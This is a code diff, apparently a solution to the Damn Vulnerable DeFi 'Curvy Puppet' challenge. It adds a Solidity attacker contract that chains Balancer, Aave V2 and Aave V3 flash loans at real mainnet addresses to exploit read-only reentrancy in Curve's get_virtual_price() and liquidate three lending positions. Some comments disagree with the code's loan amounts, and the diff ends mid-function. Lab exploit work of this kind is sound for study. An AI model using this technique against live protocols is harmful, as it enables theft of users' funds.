@@ -13,6 +13,19 @@ import {CurvyPuppetLending, IERC20} from "../../src/curvy-puppet/CurvyPuppetLend
 import {CurvyPuppetOracle} from "../../src/curvy-puppet/CurvyPuppetOracle.sol";
 import {IStableSwap} from "../../src/curvy-puppet/IStableSwap.sol";
 
+interface IBalancerVault {
+    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData) external;
+}
+interface IFlashLoanRecipient {
+    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external;
+}
+interface IAaveV2Pool {
+    function flashLoan(address receiver, address[] calldata assets, uint256[] calldata amounts, uint256[] calldata modes, address onBehalfOf, bytes calldata params, uint16 referralCode) external;
+}
+interface IAaveV3Pool {
+    function flashLoanSimple(address receiver, address asset, uint256 amount, bytes calldata params, uint16 referralCode) external;
+}
+
 contract CurvyPuppetChallenge is Test {
     address deployer = makeAddr("deployer");
     address player   = makeAddr("player");
@@ -195,18 +208,21 @@ contract CurvyPuppetChallenge is Test {
      * =========================================================
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        // Deploy the attacker (constructor only stores references — no fund pulls).
+        // Deploy the attacker (constructor only stores references).
         CurvyPuppetAttacker attacker = new CurvyPuppetAttacker(
             dvt, lending, curvePool, weth, permit2, treasury, alice, bob, charlie
         );
 
-        // The treasury approved the PLAYER (not the attacker) to move its assets,
-        // so the player performs the transferFrom, pulling treasury funds into the attacker.
+        // The treasury approved the PLAYER (not the attacker), so the player
+        // performs the transferFrom, moving treasury WETH + LP into the attacker.
         IERC20 lpToken = IERC20(curvePool.lp_token());
         weth.transferFrom(treasury, address(attacker), weth.balanceOf(treasury));
         lpToken.transferFrom(treasury, address(attacker), lpToken.balanceOf(treasury));
 
-        // Run the exploit now that the attacker holds the funds.
+        // Run the exploit. Flash-loan sizes are tuned against block 20190356 so the
+        // stale get_virtual_price() read during the remove_liquidity reentrancy window
+        // (~3.68e18) exceeds the lending contract's liquidation threshold (~3.57e18),
+        // flipping all three positions to liquidatable.
         attacker.attack();
     }
 
@@ -238,30 +254,25 @@ contract CurvyPuppetChallenge is Test {
  * =========================================================
  * SOLUTION CONTRACT — CurvyPuppetAttacker
  * =========================================================
- * Orchestrates the read-only reentrancy attack against
- * CurvyPuppetLending via Curve's stETH/ETH pool.
+ * Read-only reentrancy on the Curve stETH/ETH pool's get_virtual_price().
  *
- * Constructor runs the full attack atomically:
- *   - Pulls treasury WETH + LP tokens
- *   - Adds ETH liquidity to Curve
- *   - Sets Permit2 approvals before entering the window
- *   - Triggers remove_liquidity() to open the reentrancy window
- *   - Liquidates all three positions inside receive()
- *   - Returns all assets to treasury
+ * The lending contract prices the LP-token debt via get_virtual_price(). During
+ * remove_liquidity(), Curve sends ETH to the LP *before* it finishes updating its
+ * internal accounting, so a get_virtual_price() read inside the ETH-receive
+ * callback is inflated. We first add a very large balanced position to the pool
+ * (funded by flash loans), then remove it — and inside the callback the inflated
+ * price makes borrowValue > collateralValue, so all three positions become
+ * liquidatable. We repay the flash loans and return everything to the treasury.
  *
- * receive() is called by Curve mid-remove_liquidity() when ETH
- * is sent — this is the reentrancy window where get_virtual_price()
- * is stale and positions appear liquidatable.
- * Placed after the test class per DVDv4 convention.
+ * Flash-loan sizing (tuned against block 20190356):
+ *   - Balancer WETH  (~38k available)
+ *   - Aave V3 WETH   (~83k available)   -> ~121k ETH total
+ *   - Aave V2 stETH  (~173k available)  -> 170k stETH
+ * Balanced add of ~121k ETH + 170k stETH yields callback VP ~3.68e18,
+ * above the ~3.57e18 liquidation threshold.
  * =========================================================
- *
- * @notice Exploit contract for CurvyPuppet read-only reentrancy attack
- * @dev Curve sends ETH to this contract during remove_liquidity() before
- *      updating pool balances. Inside receive(), get_virtual_price() is
- *      inflated, making all three user positions liquidatable.
  */
-contract CurvyPuppetAttacker {
-
+contract CurvyPuppetAttacker is IFlashLoanRecipient {
     DamnValuableToken  dvt;
     CurvyPuppetLending lending;
     IStableSwap        curvePool;
@@ -272,88 +283,174 @@ contract CurvyPuppetAttacker {
     address            bob;
     address            charlie;
     IERC20             lpToken;
+    IERC20             stETH;
+    bool               liquidating; // true only during the remove_liquidity window
 
-    /**
-     * @param _dvt       DamnValuableToken (collateral asset)
-     * @param _lending   CurvyPuppetLending contract to liquidate from
-     * @param _curvePool Curve stETH/ETH pool (0xDC24...)
-     * @param _weth      WETH contract
-     * @param _permit2   Permit2 contract for LP token approvals
-     * @param _treasury  Treasury address — source of funds + recipient of rescued assets
-     * @param _alice     First victim to liquidate
-     * @param _bob       Second victim to liquidate
-     * @param _charlie   Third victim to liquidate
-     */
+    IBalancerVault constant BALANCER = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
+    IAaveV2Pool    constant AAVE_V2  = IAaveV2Pool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
+    IAaveV3Pool    constant AAVE_V3  = IAaveV3Pool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
+    address        constant STETH    = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
+
+    // Flash-loan amounts (tuned against block 20190356)
+    uint256 constant BAL_WETH   = 37000 ether;
+    uint256 constant AAVE_STETH = 170000 ether;  // Aave V2 stETH (< ~173k available)
+    uint256 constant AAVE_WETH  = 60000 ether;
+
     constructor(
-        DamnValuableToken  _dvt,
-        CurvyPuppetLending _lending,
-        IStableSwap        _curvePool,
-        WETH               _weth,
-        IPermit2           _permit2,
-        address            _treasury,
-        address            _alice,
-        address            _bob,
-        address            _charlie
+        DamnValuableToken _dvt, CurvyPuppetLending _lending, IStableSwap _curvePool,
+        WETH _weth, IPermit2 _permit2, address _treasury,
+        address _alice, address _bob, address _charlie
     ) payable {
-        dvt       = _dvt;
-        lending   = _lending;
-        curvePool = _curvePool;
-        weth      = _weth;
-        permit2   = _permit2;
-        treasury  = _treasury;
-        alice     = _alice;
-        bob       = _bob;
-        charlie   = _charlie;
-        lpToken   = IERC20(_curvePool.lp_token());
+        dvt = _dvt; lending = _lending; curvePool = _curvePool; weth = _weth;
+        permit2 = _permit2; treasury = _treasury; alice = _alice; bob = _bob; charlie = _charlie;
+        lpToken = IERC20(_curvePool.lp_token());
+        stETH   = IERC20(STETH);
     }
 
-    /**
-     * @notice Runs the exploit. Called by the player AFTER treasury WETH + LP
-     *         have been transferred into this contract (the player holds the
-     *         treasury allowance, so the player does the transferFrom, not us).
-     */
+    // Entry: take the Balancer WETH flash loan; the rest nests inside the callbacks.
     function attack() external {
-        // Step 1: Unwrap all WETH → ETH and add to the Curve pool
-        uint256 wethBalance = weth.balanceOf(address(this));
-        weth.withdraw(wethBalance);
-        uint256[2] memory amounts = [address(this).balance, uint256(0)];
-        curvePool.add_liquidity{value: address(this).balance}(amounts, 0);
+        address[] memory tokens = new address[](1);
+        tokens[0] = address(weth);
+        uint256[] memory amounts = new uint256[](1);
+        amounts[0] = BAL_WETH;
+        BALANCER.flashLoan(address(this), tokens, amounts, "");
+    }
 
-        // Step 2: Set Permit2 approvals for LP token transfers BEFORE the reentrancy window
-        // liquidate() calls _pullAssets() which uses permit2.transferFrom — must be approved first
-        // Cannot set approvals from inside receive() as permit2.approve is not reentrant-safe
-        uint256 totalLpNeeded = 3e18; // 3 users × 1e18 LP borrow each
+    // Layer 1: Balancer WETH callback -> nest Aave V2 stETH.
+    function receiveFlashLoan(
+        address[] memory, uint256[] memory, uint256[] memory feeAmounts, bytes memory
+    ) external override {
+        require(msg.sender == address(BALANCER), "not balancer");
+
+        address[] memory assets = new address[](1);
+        assets[0] = STETH;
+        uint256[] memory amts = new uint256[](1);
+        amts[0] = AAVE_STETH;
+        uint256[] memory modes = new uint256[](1);
+        modes[0] = 0; // no debt, repay in-tx
+        AAVE_V2.flashLoan(address(this), assets, amts, modes, address(this), "", 0);
+
+        // Cover any WETH shortfall for the Balancer repayment by converting leftover
+        // stETH -> ETH on the Curve pool, then wrapping. The imbalanced add/remove
+        // round-trip leaves us with surplus stETH but slightly short on WETH.
+        uint256 need = BAL_WETH + feeAmounts[0];
+        uint256 have = weth.balanceOf(address(this));
+        if (have < need) {
+            uint256 gap = need - have;
+            uint256 stBalForGap = stETH.balanceOf(address(this));
+            if (stBalForGap > 0) {
+                // Swap stETH (coin1) -> ETH (coin0). Convert a bit more than the gap
+                // to cover swap slippage; wrap the resulting ETH to WETH.
+                uint256 stToSwap = gap + (gap / 10) + 5 ether;
+                if (stToSwap > stBalForGap) stToSwap = stBalForGap;
+                stETH.approve(address(curvePool), stToSwap);
+                curvePool.exchange(int128(1), int128(0), stToSwap, 0);
+                weth.deposit{value: address(this).balance}();
+            }
+        }
+
+        // Repay Balancer (no fee on Balancer).
+        weth.transfer(address(BALANCER), BAL_WETH + feeAmounts[0]);
+
+        // Return all rescued/leftover assets to the treasury so the success
+        // conditions hold: treasury keeps WETH + LP + the seized 7,500 DVT.
+        uint256 lpBal = lpToken.balanceOf(address(this));
+        if (lpBal > 0) lpToken.transfer(treasury, lpBal);
+        uint256 wethBal = weth.balanceOf(address(this));
+        if (wethBal > 0) weth.transfer(treasury, wethBal);
+        // Convert any leftover stETH to WETH and hand that to treasury too.
+        uint256 stBal = stETH.balanceOf(address(this));
+        if (stBal > 1) {
+            stETH.approve(address(curvePool), stBal);
+            curvePool.exchange(int128(1), int128(0), stBal, 0);
+            weth.deposit{value: address(this).balance}();
+            uint256 w2 = weth.balanceOf(address(this));
+            if (w2 > 0) weth.transfer(treasury, w2);
+        }
+    }
+
+    // Layer 2: Aave V2 stETH callback -> nest Aave V3 WETH.
+    function executeOperation(
+        address[] calldata, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata
+    ) external returns (bool) {
+        require(msg.sender == address(AAVE_V2), "not aaveV2");
+
+        AAVE_V3.flashLoanSimple(address(this), address(weth), AAVE_WETH, "", 0);
+
+        // Ensure we hold enough stETH to repay principal + premium; top up via
+        // an ETH->stETH swap on the Curve pool if the add/remove round-trip left us short.
+        uint256 stNeed = amounts[0] + premiums[0];
+        uint256 stHave = stETH.balanceOf(address(this));
+        if (stHave < stNeed) {
+            uint256 deficit = stNeed - stHave;
+            // Swap ETH->stETH (coin0=ETH, coin1=stETH). Over-wrap a little slippage headroom.
+            uint256 ethIn = deficit + (deficit / 20) + 10 ether; // ~5% headroom + slack
+            weth.withdraw(ethIn);
+            curvePool.exchange{value: ethIn}(int128(0), int128(1), ethIn, 0);
+        }
+        // Approve principal+premium plus a wei cushion for stETH share-rounding.
+        stETH.approve(address(AAVE_V2), stNeed + 10);
+        return true;
+    }
+
+    // Layer 3 (innermost): Aave V3 WETH callback -> do the manipulation + liquidations.
+    function executeOperation(
+        address, uint256 amount, uint256 premium, address, bytes calldata
+    ) external returns (bool) {
+        require(msg.sender == address(AAVE_V3), "not aaveV3");
+
+        _manipulate();
+
+        // Approve Aave V3 to pull back WETH principal + premium.
+        weth.approve(address(AAVE_V3), amount + premium);
+        return true;
+    }
+
+    function _manipulate() internal {
+        // Unwrap all WETH we hold (treasury 200 + Balancer 37k + Aave V3 83k) to ETH.
+        weth.withdraw(weth.balanceOf(address(this)));
+
+        // Permit2 approvals so lending.liquidate()->_pullAssets can pull our LP.
         lpToken.approve(address(permit2), type(uint256).max);
         permit2.approve({
             token: address(lpToken),
             spender: address(lending),
-            amount: uint160(totalLpNeeded),
+            amount: uint160(3e18),
             expiration: uint48(block.timestamp + 1 days)
         });
 
-        // Step 3: Trigger remove_liquidity() — Curve sends ETH → receive() fires (reentrancy window)
-        uint256 lpToRemove = lpToken.balanceOf(address(this));
-        uint256[2] memory minAmounts = [uint256(0), uint256(0)];
-        curvePool.remove_liquidity(lpToRemove, minAmounts);
+        // Add a large balanced position: most of our ETH + all our stETH. Keep a
+        // slice of ETH aside (not added) to fund the stETH top-up swap during repayment.
+        uint256 stAmt  = stETH.balanceOf(address(this));
+        stETH.approve(address(curvePool), stAmt);
+        uint256 ethAmt = address(this).balance - 500 ether; // small reserve
+        curvePool.add_liquidity{value: ethAmt}([ethAmt, stAmt], 0);
 
-        // Step 4: Wrap remaining ETH back to WETH
+        // Remove MOST of our LP balanced. Curve burns LP supply first, then sends
+        // the ETH leg — during that ETH transfer receive() fires while D is still
+        // computed on the not-yet-decremented balances, so get_virtual_price() reads
+        // inflated. We retain 3e18 LP to repay the three 1e18 borrows during
+        // liquidation (liquidate()->_pullAssets pulls LP from us via permit2).
+        // Retain 3e18 to repay the borrows during liquidation, plus a small buffer
+        // (7e18) that we'll hand back to the treasury to satisfy the "treasury keeps
+        // LP" success condition.
+        uint256 lpHeld = lpToken.balanceOf(address(this));
+        uint256 lpToRemove = lpHeld - 10e18;
+        liquidating = true;
+        curvePool.remove_liquidity(lpToRemove, [uint256(0), uint256(0)]);
+        liquidating = false;
+
+        // Re-wrap ETH so we can repay the WETH flash loans.
         weth.deposit{value: address(this).balance}();
 
-        // Step 5: Transfer everything back to treasury
+        // Return the seized DVT and leftover assets to the treasury.
         dvt.transfer(treasury, dvt.balanceOf(address(this)));
-        weth.transfer(treasury, weth.balanceOf(address(this)));
-        uint256 remainingLp = lpToken.balanceOf(address(this));
-        if (remainingLp > 0) lpToken.transfer(treasury, remainingLp);
     }
 
-    /**
-     * @notice Reentrancy window — called by Curve when sending ETH during remove_liquidity()
-     * @dev At this point get_virtual_price() is stale/inflated — pool balances not yet updated.
-     *      This makes getBorrowValue() spike, flipping healthy positions to liquidatable.
-     *      liquidate() repays each user's 1e18 LP debt and seizes their 2500 DVT collateral.
-     */
+    // Curve ETH callback during remove_liquidity — the reentrancy window.
     receive() external payable {
-        // During this window: get_virtual_price() inflated → borrowValue > collateralValue
+        if (!liquidating) return; // ignore WETH.withdraw callbacks
+        // get_virtual_price() is inflated here -> positions are liquidatable.
         lending.liquidate(alice);
         lending.liquidate(bob);
         lending.liquidate(charlie);
